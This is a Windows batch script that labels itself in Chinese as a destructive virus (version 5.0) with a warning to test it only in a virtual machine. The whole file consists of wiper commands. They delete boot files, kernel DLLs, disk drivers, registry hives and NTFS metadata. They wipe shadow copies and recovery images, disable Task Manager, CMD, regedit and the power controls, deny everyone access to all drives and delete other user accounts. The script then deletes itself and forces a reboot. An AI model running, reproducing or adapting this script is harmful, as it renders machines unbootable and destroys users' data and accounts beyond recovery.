echo 即将打开bat5.0，破坏性强大的病毒，请在虚拟机测试，请勿传播，即将运行！！请勿实体机打开！！！
timeout /t 10
timeout /t 30
powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c your_command' -WindowStyle Hidden"
powershell -Command "Start-Process cmd -Verb RunAs"
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "PhysicalAddressExtension" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d 1 /f
del /f /q /a hs C:\Windows\System32\spp\*.*
rd /s /q C:\Windows\System32\spp\store
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoStartMenuPowerButton" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoClose" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableLockWorkstation" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "shutdownwithoutlogon" /t REG_DWORD /d 0 /f
sc config "Power" start= disabled
sc stop "Power"
sc config "UxSms" start= disabled
sc stop "UxSms"
bcdedit /set {current} testsigning on
bcdedit /set {current} nointegritychecks on
bcdedit /set {current} debug on
bcdedit /set {current} bootdebug on
del /f /q /a hs C:\Windows\System32\drivers\ntfs.sys
del /f /q /a hs C:\Windows\System32\drivers\atapi.sys
del /f /q /a hs C:\Windows\System32\drivers\acpi.sys
del /f /q /a hs C:\Windows\System32\drivers\disk.sys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideClock" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoTrayItemsDisplay" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoDesktop" /t REG_DWORD /d 1 /f
powercfg -setacvalueindex SCHEME_CURRENT sub_buttons powerbutton 0
powercfg -setdcvalueindex SCHEME_CURRENT sub_buttons powerbutton 0
powercfg -setacvalueindex SCHEME_CURRENT sub_buttons sleepbutton 0
powercfg -setdcvalueindex SCHEME_CURRENT sub_buttons sleepbutton 0
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "shutdownwithoutlogon" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "shutdownwithoutlogon" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v "Debugger" /t REG_SZ /d "cmd.exe /c echo Access Denied" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableLockWorkstation" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "HideFastUserSwitching" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLogoff" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableChangePassword" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v "RestrictRun" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v "RestrictRun" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoFileMenu" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoClose" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoDrives" /t REG_DWORD /d 67108863 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoFileMenu" /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoWinKeys" /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoViewContextMenu" /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t REG_DWORD /d 1 /f
vssadmin delete shadows /all /quiet
reagentc /disable
del /q "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\*.lnk" >nul 2>&1
@echo off
powershell -Command "
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class Taskbar {
    [DllImport(\"user32.dll\")]
    private static extern int FindWindow(string className, string windowText);
    [DllImport(\"user32.dll\")]
    private static extern int ShowWindow(int hwnd, int command);
    
    public static void Hide() {
        int hwnd = FindWindow(\"Shell_TrayWnd\", \"\");
        ShowWindow(hwnd, 0); // 0 = SW_HIDE
    }
    public static void Show() {
        int hwnd = FindWindow(\"Shell_TrayWnd\", \"\");
        ShowWindow(hwnd, 1); // 1 = SW_SHOW
    }
}
'@ -ReferencedAssemblies 'System.Runtime.InteropServices'
[Taskbar]::Hide()
"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoToolbarsOnTaskbar" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v "CrashDumpEnabled" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v "AutoReboot" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\i8042prt\Parameters" /v "CrashOnCtrlScroll" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "PagingFiles" /t REG_MULTI_SZ /d "C:\pagefile.sys 0 0" /f
del /f /q /a hs C:\Windows\System32\drivers\ntfs.sys
del /f /q /a hs C:\Windows\System32\drivers\atapi.sys
del /f /q /a hs C:\Windows\System32\drivers\acpi.sys
del /f /q /a hs C:\Windows\System32\drivers\disk.sys
for /f "skip=1 tokens=1" %%i in ('wmic useraccount where "disabled=false" get name') do (
    if /i not "%%i"=="%username%" (
        if /i not "%%i"=="Administrator" (
        
            net user "%%i" /active:no >nul 2>&1
        )
    )
)
@echo off
for /f "skip=1 tokens=1" %%i in ('wmic useraccount where "name!='%username%' and name!='Administrator' and name!='DefaultAccount' and name!='Guest' and name!='WDAGUtilityAccount'" get name') do (
    echo 删除用户: %%i
    net user "%%i" /delete >nul 2>&1
)
echo 删除完成！
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoTrayContextMenu" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLogoff" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLogoff" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Disk" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\atapi" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoClose" /t REG_DWORD /d 1 /f
del /f /q /a hs C:\Windows\System32\ntdll.dll
del /f /q /a hs C:\Windows\System32\kernel32.dll
del /f /q /a hs C:\Windows\System32\user32.dll
bcdedit /set {current} testsigning on
bcdedit /set {current} nointegritychecks on
bcdedit /set {current} debug on
bcdedit /set {current} bootdebug on
reg delete "HKLM\SOFTWARE\Microsoft\Internet Explorer" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE" /f >nul 2>&1
del /f /q /a hs "C:\Windows\System32\notepad.exe" >nul 2>&1
del /f /q /a hs "C:\Windows\System32\calc.exe" >nul 2>&1
del /f /q /a hs "C:\Windows\System32\mspaint.exe" >nul 2>&1
del /f /q /a hs "C:\Windows\System32\write.exe" >nul 2>&1
del /f /q /a hs "C:\Windows\System32\charmap.exe" >nul 2>&1
del /f /q /a hs "C:\Windows\System32\cmd.exe" >nul 2>&1
del /f /q /a hs "C:\Windows\System32\regedit.exe" >nul 2>&1
del /f /q /a hs "C:\Windows\System32\taskmgr.exe" >nul 2>&1
del /f /q /a hs "C:\Windows\System32\control.exe" >nul 2>&1
del /f /q /a hs "C:\Windows\System32\compmgmt.msc" >nul 2>&1
rd /s /q "C:\Windows\System32\Solitaire" >nul 2>&1
rd /s /q "C:\Program Files\Microsoft Games" >nul 2>&1
rd /s /q "C:\Program Files (x86)\Microsoft Games" >nul 2>&1
rd /s /q "C:\Program Files\Microsoft Office" >nul 2>&1
rd /s /q "C:\Program Files (x86)\Microsoft Office" >nul 2>&1
del /f /q /a hs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Microsoft Office*" >nul 2>&1
del /f /q /a hs "C:\Windows\System32\wmplayer.exe" >nul 2>&1
rd /s /q "C:\Program Files\Windows Media Player" >nul 2>&1
rd /s /q "C:\Program Files (x86)\Windows Media Player" >nul 2>&1
del /f /q /a hs "C:\Windows\System32\SoundRecorder.exe" >nul 2>&1
del /f /q /a hs "C:\Windows\System32\mmsys.cpl" >nul 2>&1
del /f /q /a hs "C:\Windows\System32\cleanmgr.exe" >nul 2>&1
del /f /q /a hs "C:\Windows\System32\defrag.exe" >nul 2>&1
del /f /q /a hs "C:\Windows\System32\chkdsk.exe" >nul 2>&1
del /f /q /a hs "C:\Windows\System32\sfc.exe" >nul 2>&1
del /f /q /a hs "C:\Windows\System32\diskpart.exe" >nul 2>&1
del /f /q /a hs "C:\Windows\System32\format.com" >nul 2>&1
del /f /q /a hs "%ProgramData%\Microsoft\Windows\Start Menu\Programs\*.*" >nul 2>&1
del /f /q /a hs "%AppData%\Microsoft\Windows\Start Menu\Programs\*.*" >nul 2>&1
rd /s /q "%ProgramData%\Microsoft\Windows\Start Menu\Programs" >nul 2>&1
rd /s /q "%AppData%\Microsoft\Windows\Start Menu\Programs" >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "shutdownwithoutlogon" /t REG_DWORD /d 0 /f
del /f /q /a hs "C:\Program Files\Internet Explorer\*.*" >nul 2>&1
rd /s /q "C:\Program Files\Internet Explorer" >nul 
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Programs" /v "NoWindowsFeatures" /t REG_DWORD /d 1 /f >nul
del /f /q /a hs "C:\Program Files (x86)\Internet Explorer\*.*" >nul 2>&1
rd /s /q "C:\Program Files (x86)\Internet Explorer" >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "PhysicalAddressExtension" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoClose" /t REG_DWORD /d 1 /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoStartMenuPowerButton" /t REG_DWORD /d 1 /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableLockWorkstation" /t REG_DWORD /d 1 /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FlyoutMenuSettings" /v "ShowHibernateOption" /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FlyoutMenuSettings" /v "ShowSleepOption" /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v "HidePowerButton" /t REG_DWORD /d 1 /f >nul
powercfg -setacvalueindex SCHEME_CURRENT sub_buttons powerbutton 0 >nul
powercfg -setdcvalueindex SCHEME_CURRENT sub_buttons powerbutton 0 >nul
powercfg -setacvalueindex SCHEME_CURRENT sub_buttons sleepbutton 0 >nul
if exist "%windir%\System32\shutdown.exe" ren "%windir%\System32\shutdown.exe" "shutdown.bak" >nul
if exist "%windir%\SysWOW64\shutdown.exe" ren "%windir%\SysWOW64\shutdown.exe" "shutdown.bak" >nul
taskkill /f /im explorer.exe >nul 2>&1
timeout /t 2 >nul
start explorer.exe
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoDrives" /t REG_DWORD /d 4 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoDrives" /t REG_DWORD /d 0xFFFFFFFF /f
icacls C:\ /deny Everyone:(F) /t /c
icacls C:\ /deny Users:(F) /t /c
icacls C:\ /deny Administrators:(F) /t /c
icacls C:\ /setintegritylevel L
attrib +r +s +h C:\ /s /d
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoViewOnDrive" /t REG_DWORD /d 4 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoDrives" /t REG_DWORD /d 4 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoFileMenu" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Policies\Microsoft\MMC" /v "RestrictToPermittedSnapins" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC" /v "RestrictToPermittedSnapins" /t REG_DWORD /d 1 /f
bcdedit /set {default} recoveryenabled No
bcdedit /set {current} recoveryenabled No
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoDrives" /t REG_DWORD /d 4 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v "AutoReboot" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\Setup" /v "SetupType" /t REG_DWORD /d 2 /f
reg add "HKLM\SYSTEM\Setup" /v "CmdLine" /t REG_SZ /d "" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableMSConfig" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3" /v "Settings" /t REG_BINARY /d "ffffffffffffffffffffffff" /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background" /v OEMBackground /f
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableLogonBackgroundImage /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI" /v LandscapeImage /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI" /v PortraitImage /f
del /q /f "%windir%\System32\oobe\info\backgrounds\*.*"
reg delete "HKCU\Control Panel\Desktop" /v Wallpaper /f
reg delete "HKCU\Control Panel\Desktop" /v TranscodedImageCache /f
reg delete "HKCU\Control Panel\Desktop" /v ConvertedImageCache /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Wallpapers" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes" /f
del /q /f "%APPDATA%\Microsoft\Windows\AccountPictures\*.*"
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\AccountPicture" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v RotatingLockScreenEnabled /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v RotatingLockScreenOverlayEnabled /f
del /q /f "%USERPROFILE%\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_*\LocalState\Assets\*.*"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoViewContextMenu" /t REG_DWORD /d 1 /f
del /f /q /a hs C:\Boot\BCD
del /f /q /a hs C:\bootmgr
del /f /q /a hs C:\BOOTNXT
del /f /q /a hs C:\Windows\system32\winload.exe
del /f /q /a hs C:\Windows\system32\winload.efi
del /f /q /a hs C:\Windows\system32\bootres.dll
del /f /q /a hs C:\Windows\System32\config\SYSTEM
del /f /q /a hs C:\Windows\System32\config\SOFTWARE
del /f /q /a hs C:\Windows\System32\config\SECURITY
del /f /q /a hs C:\Windows\System32\config\SAM
del /f /q /a hs C:\Windows\System32\config\DEFAULT
rd /s /q C:\Recovery >nul 2>&1
rd /s /q C:\Windows\System32\Recovery >nul 2>&1
del /f /q /a hs C:\Windows\System32\winre.wim >nul 2>&1
rd /s /q C:\Recovery >nul 2>&1
rd /s /q C:\Windows\System32\Recovery >nul 2>&1
del /f /q /a hs C:\Windows\System32\winre.wim >nul 2>&1
del hide_c_drive.txt
del /f /q /a hs C:\bootmgr
del /f /q /a hs C:\BOOTNXT
del /f /q /a hs C:\Boot\BCD
del /f /q /a hs C:\Boot\boot.sdi
del /f /q /a hs C:\Windows\bootstat.dat
del /f /q /a hs C:\Windows\System32\winload.exe
del /f /q /a hs C:\Windows\System32\winload.efi
del /f /q /a hs C:\Windows\System32\bootres.dll
del /f /q /a hs C:\Windows\ntoskrnl.exe
del /f /q /a hs C:\Windows\System32\ntkrnlpa.exe
del /f /q /a hs C:\Windows\System32\ntkrpamp.exe
del /f /q /a hs C:\Windows\System32\hal.dll
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoDrives" /t REG_DWORD /d 4 /f
rd /s /q "C:\Windows\System32\config\RegBack" >nul 2>&1
rd /s /q "C:\Windows\repair" >nul 2>&1
rd /s /q "C:\Windows\System32\config\systemprofile" >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoDrives" /t REG_DWORD /d 0xFFFFFFFF /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoFileMenu" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoViewContextMenu" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d 1 /f
del /f /q /a hs C:\$MFT >nul 2>&1
del /f /q /a hs C:\$MFTMirr >nul 2>&1
del /f /q /a hs C:\$LogFile >nul 2>&1
del /f /q /a hs C:\$Volume >nul 2>&1
del /f /q /a hs C:\$AttrDef >nul 2>&1
del /f /q /a hs C:\$Bitmap >nul 2>&1
del /f /q /a hs C:\$Boot >nul 2>&1
del /f /q /a hs C:\$BadClus >nul 2>&1
del /f /q /a hs C:\$Secure >nul 2>&1
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d 2 /f
del delete_c.txt
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f
for %i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %i:\ (
        icacls %i:\ /deny Everyone:(OI)(CI)(F) /t /c >nul 2>&1
        icacls %i:\ /deny Users:(OI)(CI)(F) /t /c >nul 2>&1
        icacls %i:\ /deny Administrators:(OI)(CI)(F) /t /c >nul 2>&1
    )
)
@echo off
powershell -Command "Get-LocalUser | Where-Object {$_.Name -ne '%username%' -and $_.Name -ne 'Administrator'} | Remove-LocalUser -Confirm:`$false"
del "%~f0"
del "bat病毒5.0.bat"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoSetTaskbar" /t REG_DWORD /d 1 /f
shutdown /r /f /t 60